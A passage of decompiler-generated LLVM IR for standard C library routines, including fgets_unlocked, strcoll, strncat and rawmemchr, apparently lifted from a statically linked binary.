  %v0_8056df4 = phi i32 [ %v3_8056e5b, %dec_label_pc_8056e5b ], [ %v0_8056e5e1, %dec_label_pc_8056d7a ]
  %v1_8056de6 = inttoptr i32 %v0_8056df4 to i8*
  %v2_8056de6 = load i8, i8* %v1_8056de6, align 1
  %v3_8056de6 = and i8 %v2_8056de6, 64
  %v4_8056de6 = icmp eq i8 %v3_8056de6, 0
  br i1 %v4_8056de6, label %dec_label_pc_8056e5b, label %dec_label_pc_8056deb

dec_label_pc_8056deb:                             ; preds = %dec_label_pc_8056de6
  %v0_8056deb = load i32, i32* @global_var_805f670.1031, align 16
  %v9_8056deb = icmp eq i32 %v0_8056deb, 2
  br i1 %v9_8056deb, label %dec_label_pc_8056e13, label %dec_label_pc_8056df4

dec_label_pc_8056df4:                             ; preds = %dec_label_pc_8056deb
  %v1_8056df4 = add i32 %v0_8056df4, 56
  store i32 %v1_8056df4, i32* @ebx, align 4
  store i32 %v2_8056d87, i32* @eax, align 4
  %v2_8056e03 = call i32 @__pthread_return_void(i32 %v2_8056d87, i32 134564427)
  %v0_8056e08 = load i32, i32* @ebx, align 4
  %v1_8056e0b = call i32 @__pthread_return_0(i32 %v0_8056e08)
  %v1_8056e15.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056e13

dec_label_pc_8056e13:                             ; preds = %dec_label_pc_8056deb, %dec_label_pc_8056df4
  %v0_8056e25 = phi i32 [ %v0_8056df4, %dec_label_pc_8056deb ], [ %v1_8056e15.pre, %dec_label_pc_8056df4 ]
  %v0_8056e13 = load i32, i32* @ebp, align 4
  %v2_8056e15 = inttoptr i32 %v0_8056e25 to i32*
  %v3_8056e15 = load i32, i32* %v2_8056e15, align 4
  %v4_8056e15 = or i32 %v3_8056e15, %v0_8056e13
  %v2_8056e17 = urem i32 %v4_8056e15, 65536
  %v9_8056e17 = and i32 %v2_8056e17, 832
  %v2_8056e1b = icmp eq i32 %v9_8056e17, 320
  %v1_8056e20 = icmp eq i1 %v2_8056e1b, false
  br i1 %v1_8056e20, label %dec_label_pc_8056e41, label %dec_label_pc_8056e22

dec_label_pc_8056e22:                             ; preds = %dec_label_pc_8056e13
  %v1_8056e26 = call i32 @__stdio_wcommit(i32 %v0_8056e25)
  %v1_8056e2e = icmp eq i32 %v1_8056e26, 0
  br i1 %v1_8056e2e, label %dec_label_pc_8056e37, label %dec_label_pc_8056e32

dec_label_pc_8056e32:                             ; preds = %dec_label_pc_8056e22
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8056e41

dec_label_pc_8056e37:                             ; preds = %dec_label_pc_8056e22
  %v0_8056e37 = load i32, i32* @esi, align 4
  %v1_8056e37 = inttoptr i32 %v0_8056e37 to i16*
  %v2_8056e37 = load i16, i16* %v1_8056e37, align 2
  %v3_8056e37 = and i16 %v2_8056e37, -65
  store i16 %v3_8056e37, i16* %v1_8056e37, align 2
  %v0_8056e3b = load i32, i32* @esi, align 4
  %v1_8056e3b = add i32 %v0_8056e3b, 8
  %v2_8056e3b = inttoptr i32 %v1_8056e3b to i32*
  %v3_8056e3b = load i32, i32* %v2_8056e3b, align 4
  %v2_8056e3e = add i32 %v0_8056e3b, 28
  %v3_8056e3e = inttoptr i32 %v2_8056e3e to i32*
  store i32 %v3_8056e3b, i32* %v3_8056e3e, align 4
  br label %dec_label_pc_8056e41

dec_label_pc_8056e41:                             ; preds = %dec_label_pc_8056e13, %dec_label_pc_8056e32, %dec_label_pc_8056e37
  %v0_8056e41 = load i32, i32* @global_var_805f670.1031, align 16
  %v9_8056e41 = icmp eq i32 %v0_8056e41, 2
  br i1 %v9_8056e41, label %dec_label_pc_8056e5b, label %dec_label_pc_8056e4a

dec_label_pc_8056e4a:                             ; preds = %dec_label_pc_8056e41
  store i32 %v2_8056d87, i32* @eax, align 4
  %v2_8056e53 = call i32 @__pthread_return_void(i32 %v2_8056d87, i32 1)
  br label %dec_label_pc_8056e5b

dec_label_pc_8056e5b:                             ; preds = %dec_label_pc_8056e41, %dec_label_pc_8056de6, %dec_label_pc_8056e4a
  %v0_8056e5b = load i32, i32* @esi, align 4
  %v1_8056e5b = add i32 %v0_8056e5b, 32
  %v2_8056e5b = inttoptr i32 %v1_8056e5b to i32*
  %v3_8056e5b = load i32, i32* %v2_8056e5b, align 4
  store i32 %v3_8056e5b, i32* @esi, align 4
  %v1_8056e5e = icmp eq i32 %v3_8056e5b, 0
  %v1_8056e60 = icmp eq i1 %v1_8056e5e, false
  br i1 %v1_8056e60, label %dec_label_pc_8056de6, label %dec_label_pc_8056e62

dec_label_pc_8056e62:                             ; preds = %dec_label_pc_8056e5b, %dec_label_pc_8056d7a
  %v0_8056e62 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_8056e8f

dec_label_pc_8056e69:                             ; preds = %dec_label_pc_8056d6d
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_8056e6b = load i8, i8* %tmp23, align 1
  %v4_8056e6b = and i8 %v3_8056e6b, 64
  %v5_8056e6b = icmp eq i8 %v4_8056e6b, 0
  br i1 %v5_8056e6b, label %dec_label_pc_8056e8f, label %dec_label_pc_8056e70

dec_label_pc_8056e70:                             ; preds = %dec_label_pc_8056e69
  store i32 -1, i32* @edi, align 4
  %v1_8056e77 = call i32 @__stdio_wcommit(i32 %v4_8056d61)
  %v1_8056e7f = icmp eq i32 %v1_8056e77, 0
  %v1_8056e81 = icmp eq i1 %v1_8056e7f, false
  br i1 %v1_8056e81, label %dec_label_pc_8056e8f, label %dec_label_pc_8056e83

dec_label_pc_8056e83:                             ; preds = %dec_label_pc_8056e70
  %v3_8056e83 = load i16, i16* %arg1, align 2
  %v4_8056e83 = and i16 %v3_8056e83, -65
  store i16 %v4_8056e83, i16* %arg1, align 2
  %v2_8056e87 = add i32 %v4_8056d61, 8
  %v3_8056e87 = inttoptr i32 %v2_8056e87 to i32*
  %v4_8056e87 = load i32, i32* %v3_8056e87, align 4
  %v3_8056e8a = add i32 %v4_8056d61, 28
  %v4_8056e8a = inttoptr i32 %v3_8056e8a to i32*
  store i32 %v4_8056e87, i32* %v4_8056e8a, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8056e8f

dec_label_pc_8056e8f:                             ; preds = %dec_label_pc_8056e70, %dec_label_pc_8056e69, %dec_label_pc_8056e62, %dec_label_pc_8056e83
  %v0_8056e92 = load i32, i32* @edi, align 4
  store i32 %v0_8056d5b, i32* @ebx, align 4
  store i32 %v0_8056d5a, i32* @esi, align 4
  store i32 %v0_8056d59, i32* @edi, align 4
  store i32 %v0_8056d58, i32* @ebp, align 4
  ret i32 %v0_8056e92

; uselistorder directives
  uselistorder i32 %v3_8056e5b, { 1, 2, 0 }
  uselistorder i32 %v2_8056d87, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805f63c.924 to i32*), { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805f640.922 to i32), { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* @global_var_80638e4.1029, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 (i32)* @__pthread_return_0, { 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 3, 29, 31, 30, 28, 2, 1, 0, 6, 5, 7, 8, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_805f658.923 to i32), { 1, 3, 4, 5, 9, 2, 6, 0, 7, 8 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 0, 51, 50, 55, 54, 53, 52, 49, 48, 5, 4, 3, 2, 7, 6, 9, 8 }
  uselistorder i32 134564427, { 18, 19, 2, 3, 4, 5, 20, 21, 6, 22, 23, 7, 8, 25, 26, 27, 28, 29, 30, 0, 9, 10, 11, 12, 13, 14, 15, 16, 1, 24, 17 }
  uselistorder i16* %arg1, { 1, 2, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_8056e8f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8056e5b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056e41, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056e13, { 1, 0 }
  uselistorder label %dec_label_pc_8056de6, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8056e9c = load i32, i32* @ebp, align 4
  %v4_8056ea3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056ea3, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_8056ea3, i32* @ebx, align 4
  %tmp16 = icmp slt i32 %arg2, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_8056eed.preheader, label %dec_label_pc_8056ef9

dec_label_pc_8056eed.preheader:                   ; preds = %entry
  %v1_8056eed18 = add i32 %arg2, -1
  %v8_8056eed19 = icmp eq i32 %v1_8056eed18, 0
  store i32 %v1_8056eed18, i32* @esi, align 4
  %v1_8056eee20 = icmp eq i1 %v8_8056eed19, false
  br i1 %v1_8056eee20, label %dec_label_pc_8056eb7, label %dec_label_pc_8056ef0

dec_label_pc_8056eb7:                             ; preds = %dec_label_pc_8056eed.preheader, %dec_label_pc_8056eeb.dec_label_pc_8056eed_crit_edge.dec_label_pc_8056eb7_crit_edge
  %v0_8056eb7 = phi i32 [ %v0_8056eb7.pre, %dec_label_pc_8056eeb.dec_label_pc_8056eed_crit_edge.dec_label_pc_8056eb7_crit_edge ], [ %arg3, %dec_label_pc_8056eed.preheader ]
  %v1_8056eb7 = add i32 %v0_8056eb7, 16
  %v2_8056eb7 = inttoptr i32 %v1_8056eb7 to i32*
  %v3_8056eb7 = load i32, i32* %v2_8056eb7, align 4
  store i32 %v3_8056eb7, i32* %eax.global-to-local, align 4
  %v2_8056eba = add i32 %v0_8056eb7, 24
  %v3_8056eba = inttoptr i32 %v2_8056eba to i32*
  %v4_8056eba = load i32, i32* %v3_8056eba, align 4
  %v10_8056eba = icmp ult i32 %v3_8056eb7, %v4_8056eba
  %v1_8056ebd = icmp eq i1 %v10_8056eba, false
  br i1 %v1_8056ebd, label %dec_label_pc_8056ecd, label %dec_label_pc_8056ebf

dec_label_pc_8056ebf:                             ; preds = %dec_label_pc_8056eb7
  %v1_8056ebf = inttoptr i32 %v3_8056eb7 to i8*
  %v2_8056ebf = load i8, i8* %v1_8056ebf, align 1
  %v3_8056ebf = zext i8 %v2_8056ebf to i32
  %v4_8056ebf = load i32, i32* @edx, align 4
  %v5_8056ebf = and i32 %v4_8056ebf, -256
  %v6_8056ebf = or i32 %v5_8056ebf, %v3_8056ebf
  store i32 %v6_8056ebf, i32* @edx, align 4
  %v1_8056ec1 = add i32 %v3_8056eb7, 1
  store i32 %v1_8056ec1, i32* %eax.global-to-local, align 4
  %v2_8056ec2 = load i32, i32* @ebx, align 4
  %v3_8056ec2 = inttoptr i32 %v2_8056ec2 to i8*
  store i8 %v2_8056ebf, i8* %v3_8056ec2, align 1
  %v0_8056ec4 = load i32, i32* @ebx, align 4
  %v1_8056ec4 = add i32 %v0_8056ec4, 1
  store i32 %v1_8056ec4, i32* @ebx, align 4
  %v0_8056ec5 = load i32, i32* @edx, align 4
  %v1_8056ec5 = trunc i32 %v0_8056ec5 to i8
  %v10_8056ec5 = icmp eq i8 %v1_8056ec5, 10
  %v0_8056ec8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056ec8 = load i32, i32* @ebp, align 4
  %v2_8056ec8 = add i32 %v1_8056ec8, 16
  %v3_8056ec8 = inttoptr i32 %v2_8056ec8 to i32*
  store i32 %v0_8056ec8, i32* %v3_8056ec8, align 4
  br i1 %v10_8056ec5, label %dec_label_pc_8056ef0, label %dec_label_pc_8056eeb.dec_label_pc_8056eed_crit_edge

dec_label_pc_8056ecd:                             ; preds = %dec_label_pc_8056eb7
  %v0_8056ed1 = call i32 @getc_unlocked()
  %v1_8056ed1 = trunc i32 %v0_8056ed1 to i8
  store i32 %v0_8056ed1, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_8056ed1, 256
  %v11_8056ed9 = icmp eq i32 %sext.mask, 255
  %v1_8056edc = icmp eq i1 %v11_8056ed9, false
  br i1 %v1_8056edc, label %dec_label_pc_8056eeb, label %dec_label_pc_8056ede

dec_label_pc_8056ede:                             ; preds = %dec_label_pc_8056ecd
  %v0_8056ede = load i32, i32* @ebp, align 4
  %v1_8056ede = inttoptr i32 %v0_8056ede to i8*
  %v2_8056ede = load i8, i8* %v1_8056ede, align 1
  %v3_8056ede = and i8 %v2_8056ede, 8
  %v4_8056ede = icmp eq i8 %v3_8056ede, 0
  br i1 %v4_8056ede, label %dec_label_pc_8056ef0, label %dec_label_pc_8056ef9

dec_label_pc_8056eeb:                             ; preds = %dec_label_pc_8056ecd
  %v3_8056ee6 = load i32, i32* @ebx, align 4
  %v4_8056ee6 = inttoptr i32 %v3_8056ee6 to i8*
  store i8 %v1_8056ed1, i8* %v4_8056ee6, align 1
  %v0_8056ee8 = load i32, i32* @ebx, align 4
  %v1_8056ee8 = add i32 %v0_8056ee8, 1
  store i32 %v1_8056ee8, i32* @ebx, align 4
  %v11_8056ee9 = icmp eq i8 %v1_8056ed1, 10
  br i1 %v11_8056ee9, label %dec_label_pc_8056ef0, label %dec_label_pc_8056eeb.dec_label_pc_8056eed_crit_edge

dec_label_pc_8056eeb.dec_label_pc_8056eed_crit_edge: ; preds = %dec_label_pc_8056ebf, %dec_label_pc_8056eeb
  %v0_8056eed.pre = load i32, i32* @esi, align 4
  %v1_8056eed = add i32 %v0_8056eed.pre, -1
  %v8_8056eed = icmp eq i32 %v1_8056eed, 0
  store i32 %v1_8056eed, i32* @esi, align 4
  %v1_8056eee = icmp eq i1 %v8_8056eed, false
  br i1 %v1_8056eee, label %dec_label_pc_8056eeb.dec_label_pc_8056eed_crit_edge.dec_label_pc_8056eb7_crit_edge, label %dec_label_pc_8056ef0

dec_label_pc_8056eeb.dec_label_pc_8056eed_crit_edge.dec_label_pc_8056eb7_crit_edge: ; preds = %dec_label_pc_8056eeb.dec_label_pc_8056eed_crit_edge
  %v0_8056eb7.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8056eb7

dec_label_pc_8056ef0:                             ; preds = %dec_label_pc_8056eed.preheader, %dec_label_pc_8056ebf, %dec_label_pc_8056eeb.dec_label_pc_8056eed_crit_edge, %dec_label_pc_8056eeb, %dec_label_pc_8056ede
  %v0_8056ef0 = load i32, i32* @ebx, align 4
  %v1_8056ef0 = load i32, i32* @edi, align 4
  %tmp22 = icmp ugt i32 %v0_8056ef0, %v1_8056ef0
  br i1 %tmp22, label %dec_label_pc_8056ef4, label %dec_label_pc_8056ef9

dec_label_pc_8056ef4:                             ; preds = %dec_label_pc_8056ef0
  %v1_8056ef4 = inttoptr i32 %v0_8056ef0 to i8*
  store i8 0, i8* %v1_8056ef4, align 1
  %v0_8056efe.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056efb

dec_label_pc_8056ef9:                             ; preds = %dec_label_pc_8056ef0, %dec_label_pc_8056ede, %entry
  br label %dec_label_pc_8056efb

dec_label_pc_8056efb:                             ; preds = %dec_label_pc_8056ef4, %dec_label_pc_8056ef9
  %v0_8056efe = phi i32 [ %v0_8056efe.pre, %dec_label_pc_8056ef4 ], [ 0, %dec_label_pc_8056ef9 ]
  store i32 %v0_8056efe, i32* %eax.global-to-local, align 4
  store i32 %v0_8056e9c, i32* @ebp, align 4
  ret i32 %v0_8056efe

; uselistorder directives
  uselistorder i32 %v0_8056efe, { 1, 0 }
  uselistorder i32 %v0_8056ef0, { 1, 0 }
  uselistorder i32 %v1_8056eed, { 1, 0 }
  uselistorder i32 %v0_8056ed1, { 0, 2, 1 }
  uselistorder i32 %v0_8056eb7, { 1, 0 }
  uselistorder i8 10, { 0, 1, 2, 3, 4, 14, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15 }
  uselistorder label %dec_label_pc_8056efb, { 1, 0 }
  uselistorder label %dec_label_pc_8056ef0, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_8056eeb.dec_label_pc_8056eed_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8056eb7, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8056f0a = ptrtoint i8* %arg1 to i32
  %v4_8056f12.pre = load i32, i32* @eax, align 4
  %v8_8056f12.pre = load i1, i1* @df, align 1
  %v9_8056f12 = select i1 %v8_8056f12.pre, i32 -1, i32 1
  br label %dec_label_pc_8056f12

dec_label_pc_8056f12:                             ; preds = %dec_label_pc_8056f16, %entry
  %v20_8056f13 = phi i32 [ %v23_8056f13, %dec_label_pc_8056f16 ], [ %arg2, %entry ]
  %v4_8056f12 = phi i32 [ %v6_8056f12, %dec_label_pc_8056f16 ], [ %v4_8056f12.pre, %entry ]
  %v7_8056f12 = phi i32 [ %v10_8056f12, %dec_label_pc_8056f16 ], [ %v4_8056f0a, %entry ]
  %v1_8056f12 = inttoptr i32 %v7_8056f12 to i8*
  %v2_8056f12 = load i8, i8* %v1_8056f12, align 1
  %v3_8056f13 = inttoptr i32 %v20_8056f13 to i8*
  %v4_8056f13 = load i8, i8* %v3_8056f13, align 1
  %v15_8056f13 = icmp eq i8 %v2_8056f12, %v4_8056f13
  %v1_8056f14 = icmp eq i1 %v15_8056f13, false
  br i1 %v1_8056f14, label %dec_label_pc_8056f1e, label %dec_label_pc_8056f16

dec_label_pc_8056f16:                             ; preds = %dec_label_pc_8056f12
  %v3_8056f12 = zext i8 %v2_8056f12 to i32
  %v5_8056f12 = and i32 %v4_8056f12, -256
  %v6_8056f12 = or i32 %v3_8056f12, %v5_8056f12
  %v23_8056f13 = add i32 %v20_8056f13, %v9_8056f12
  %v10_8056f12 = add i32 %v7_8056f12, %v9_8056f12
  %v4_8056f16 = icmp eq i8 %v2_8056f12, 0
  %v1_8056f18 = icmp eq i1 %v4_8056f16, false
  br i1 %v1_8056f18, label %dec_label_pc_8056f12, label %dec_label_pc_8056f22

dec_label_pc_8056f1e:                             ; preds = %dec_label_pc_8056f12
  br label %dec_label_pc_8056f22

dec_label_pc_8056f22:                             ; preds = %dec_label_pc_8056f16, %dec_label_pc_8056f1e
  %storemerge = phi i32 [ 1, %dec_label_pc_8056f1e ], [ 0, %dec_label_pc_8056f16 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8056f12, { 1, 2, 0 }
  uselistorder i32 %v9_8056f12, { 1, 0 }
  uselistorder label %dec_label_pc_8056f22, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_8056f29 = load i32, i32* @esi, align 4
  store i32 %v0_8056f29, i32* %stack_var_-8, align 4
  %v4_8056f2a = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8056f2a, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8056f37 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8056f3b = call i32 @_strlen(i8* %v4_8056f37)
  %v2_8056f3d = add i32 %tmp, -1
  store i32 %v2_8056f3d, i32* %edi.global-to-local, align 4
  %v0_8056f3e = load i32, i32* %edx.global-to-local, align 4
  %v8_8056f4110 = icmp eq i32 %v0_8056f3e, 0
  store i32 %v0_8056f3e, i32* %ecx.global-to-local, align 4
  br i1 %v8_8056f4110, label %dec_label_pc_8056f4c, label %dec_label_pc_8056f44.lr.ph

dec_label_pc_8056f44.lr.ph:                       ; preds = %entry
  %v4_8056f44.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8056f44.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8056f44

dec_label_pc_8056f44:                             ; preds = %dec_label_pc_8056f44.lr.ph, %dec_label_pc_8056f44.dec_label_pc_8056f41_crit_edge
  %v8_8056f44 = phi i1 [ %v8_8056f44.pre, %dec_label_pc_8056f44.lr.ph ], [ %v5_8056f45, %dec_label_pc_8056f44.dec_label_pc_8056f41_crit_edge ]
  %v4_8056f44 = phi i32 [ %v4_8056f44.pre, %dec_label_pc_8056f44.lr.ph ], [ %v0_8056f46, %dec_label_pc_8056f44.dec_label_pc_8056f41_crit_edge ]
  %v2_8056f4e11 = phi i32 [ %v2_8056f3d, %dec_label_pc_8056f44.lr.ph ], [ %v7_8056f45, %dec_label_pc_8056f44.dec_label_pc_8056f41_crit_edge ]
  %v0_8056f44 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056f44 = inttoptr i32 %v0_8056f44 to i8*
  %v2_8056f44 = load i8, i8* %v1_8056f44, align 1
  %v3_8056f44 = zext i8 %v2_8056f44 to i32
  %v5_8056f44 = and i32 %v4_8056f44, -256
  %v6_8056f44 = or i32 %v5_8056f44, %v3_8056f44
  store i32 %v6_8056f44, i32* %eax.global-to-local, align 4
  %v9_8056f44 = select i1 %v8_8056f44, i32 -1, i32 1
  %v10_8056f44 = add i32 %v9_8056f44, %v0_8056f44
  store i32 %v10_8056f44, i32* %esi.global-to-local, align 4
  %v3_8056f45 = inttoptr i32 %v2_8056f4e11 to i8*
  store i8 %v2_8056f44, i8* %v3_8056f45, align 1
  %v4_8056f45 = load i32, i32* %edi.global-to-local, align 4
  %v5_8056f45 = load i1, i1* @df, align 1
  %v6_8056f45 = select i1 %v5_8056f45, i32 -1, i32 1
  %v7_8056f45 = add i32 %v6_8056f45, %v4_8056f45
  store i32 %v7_8056f45, i32* %edi.global-to-local, align 4
  %v0_8056f46 = load i32, i32* %eax.global-to-local, align 4
  %v3_8056f46 = trunc i32 %v0_8056f46 to i8
  %v4_8056f46 = icmp eq i8 %v3_8056f46, 0
  %v1_8056f48 = icmp eq i1 %v4_8056f46, false
  br i1 %v1_8056f48, label %dec_label_pc_8056f44.dec_label_pc_8056f41_crit_edge, label %dec_label_pc_8056f4f

dec_label_pc_8056f44.dec_label_pc_8056f41_crit_edge: ; preds = %dec_label_pc_8056f44
  %v0_8056f41.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056f41 = add i32 %v0_8056f41.pre, -1
  %v8_8056f41 = icmp eq i32 %v1_8056f41, 0
  store i32 %v1_8056f41, i32* %ecx.global-to-local, align 4
  br i1 %v8_8056f41, label %dec_label_pc_8056f4c, label %dec_label_pc_8056f44

dec_label_pc_8056f4c:                             ; preds = %dec_label_pc_8056f44.dec_label_pc_8056f41_crit_edge, %entry
  %v2_8056f4e.lcssa = phi i32 [ %v2_8056f3d, %entry ], [ %v7_8056f45, %dec_label_pc_8056f44.dec_label_pc_8056f41_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8056f4e = inttoptr i32 %v2_8056f4e.lcssa to i8*
  store i8 0, i8* %v3_8056f4e, align 1
  %v4_8056f4e = load i32, i32* %edi.global-to-local, align 4
  %v5_8056f4e = load i1, i1* @df, align 1
  %v6_8056f4e = select i1 %v5_8056f4e, i32 -1, i32 1
  %v7_8056f4e = add i32 %v6_8056f4e, %v4_8056f4e
  store i32 %v7_8056f4e, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8056f4f

dec_label_pc_8056f4f:                             ; preds = %dec_label_pc_8056f44, %dec_label_pc_8056f4c
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8056f53 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056f53, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8056f41, { 1, 0 }
  uselistorder i32 %v0_8056f46, { 1, 0 }
  uselistorder i32 %v7_8056f45, { 0, 2, 1 }
  uselistorder i1 %v5_8056f45, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8056f4f, { 1, 0 }
  uselistorder label %dec_label_pc_8056f44, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8056f59 = load i32, i32* @ebx, align 4
  %v4_8056f5a = urem i32 %arg2, 256
  %v4_8056f5e = ptrtoint i8* %arg1 to i32
  %v2_8056f693 = urem i32 %v4_8056f5e, 4
  %v3_8056f694 = icmp eq i32 %v2_8056f693, 0
  %v1_8056f6b8 = icmp eq i1 %v3_8056f694, false
  %v4_8056f64 = trunc i32 %arg2 to i8
  br i1 %v1_8056f6b8, label %dec_label_pc_8056f64, label %dec_label_pc_8056f6d

dec_label_pc_8056f64:                             ; preds = %entry, %dec_label_pc_8056f68
  %v0_8056f68 = phi i32 [ %v1_8056f68, %dec_label_pc_8056f68 ], [ %v4_8056f5e, %entry ]
  %v1_8056f64 = inttoptr i32 %v0_8056f68 to i8*
  %v2_8056f64 = load i8, i8* %v1_8056f64, align 1
  %v15_8056f64 = icmp eq i8 %v2_8056f64, %v4_8056f64
  br i1 %v15_8056f64, label %dec_label_pc_8056fb8, label %dec_label_pc_8056f68

dec_label_pc_8056f68:                             ; preds = %dec_label_pc_8056f64
  %v1_8056f68 = add i32 %v0_8056f68, 1
  %v2_8056f69 = urem i32 %v1_8056f68, 4
  %v3_8056f69 = icmp eq i32 %v2_8056f69, 0
  %v1_8056f6b = icmp eq i1 %v3_8056f69, false
  br i1 %v1_8056f6b, label %dec_label_pc_8056f64, label %dec_label_pc_8056f6d

dec_label_pc_8056f6d:                             ; preds = %entry, %dec_label_pc_8056f68
  %v0_8056f70 = phi i32 [ %v1_8056f68, %dec_label_pc_8056f68 ], [ %v4_8056f5e, %entry ]
  %v2_8056f74 = mul nuw nsw i32 %v4_8056f5a, 256
  %v2_8056f77 = or i32 %v2_8056f74, %v4_8056f5a
  %v2_8056f7b = mul i32 %v2_8056f77, 65536
  %v2_8056f7e = or i32 %v2_8056f7b, %v2_8056f77
  br label %dec_label_pc_8056f80

dec_label_pc_8056f80:                             ; preds = %dec_label_pc_8056fb0, %dec_label_pc_8056f80, %dec_label_pc_8056f6d
  %v0_8056f84 = phi i32 [ %v0_8056f70, %dec_label_pc_8056f6d ], [ %v1_8056f84, %dec_label_pc_8056f80 ], [ %v1_8056f84, %dec_label_pc_8056fb0 ]
  %v2_8056f82 = inttoptr i32 %v0_8056f84 to i32*
  %v3_8056f82 = load i32, i32* %v2_8056f82, align 4
  %v4_8056f82 = xor i32 %v3_8056f82, %v2_8056f7e
  %v1_8056f84 = add i32 %v0_8056f84, 4
  store i32 %v1_8056f84, i32* @ecx, align 4
  %v1_8056f87 = add i32 %v4_8056f82, 2130640639
  %v1_8056f8d = sub i32 -1, %v4_8056f82
  store i32 %v1_8056f8d, i32* @edx, align 4
  %v2_8056f8f = xor i32 %v1_8056f87, %v1_8056f8d
  %v1_8056f91 = and i32 %v2_8056f8f, -2130640640
  %v2_8056f91 = icmp eq i32 %v1_8056f91, 0
  br i1 %v2_8056f91, label %dec_label_pc_8056f80, label %dec_label_pc_8056f98

dec_label_pc_8056f98:                             ; preds = %dec_label_pc_8056f80
  %v2_8056f9b = inttoptr i32 %v0_8056f84 to i8*
  %v3_8056f9b = load i8, i8* %v2_8056f9b, align 1
  %v16_8056f9b = icmp eq i8 %v3_8056f9b, %v4_8056f64
  br i1 %v16_8056f9b, label %dec_label_pc_8056fb8, label %dec_label_pc_8056fa0

dec_label_pc_8056fa0:                             ; preds = %dec_label_pc_8056f98
  %v1_8056fa0 = add i32 %v0_8056f84, 1
  %v2_8056fa3 = inttoptr i32 %v1_8056fa0 to i8*
  %v3_8056fa3 = load i8, i8* %v2_8056fa3, align 1
  %v16_8056fa3 = icmp eq i8 %v3_8056fa3, %v4_8056f64
  br i1 %v16_8056fa3, label %dec_label_pc_8056fb8, label %dec_label_pc_8056fa8

dec_label_pc_8056fa8:                             ; preds = %dec_label_pc_8056fa0
  %v1_8056fa8 = add i32 %v0_8056f84, 2
  %v2_8056fab = inttoptr i32 %v1_8056fa8 to i8*
  %v3_8056fab = load i8, i8* %v2_8056fab, align 1
  %v16_8056fab = icmp eq i8 %v3_8056fab, %v4_8056f64
  br i1 %v16_8056fab, label %dec_label_pc_8056fb8, label %dec_label_pc_8056fb0

dec_label_pc_8056fb0:                             ; preds = %dec_label_pc_8056fa8
  %v1_8056fb0 = add i32 %v0_8056f84, 3
  %v2_8056fb3 = inttoptr i32 %v1_8056fb0 to i8*
  %v3_8056fb3 = load i8, i8* %v2_8056fb3, align 1
  %v16_8056fb3 = icmp eq i8 %v3_8056fb3, %v4_8056f64
  %v1_8056fb6 = icmp eq i1 %v16_8056fb3, false
  br i1 %v1_8056fb6, label %dec_label_pc_8056f80, label %dec_label_pc_8056fb8

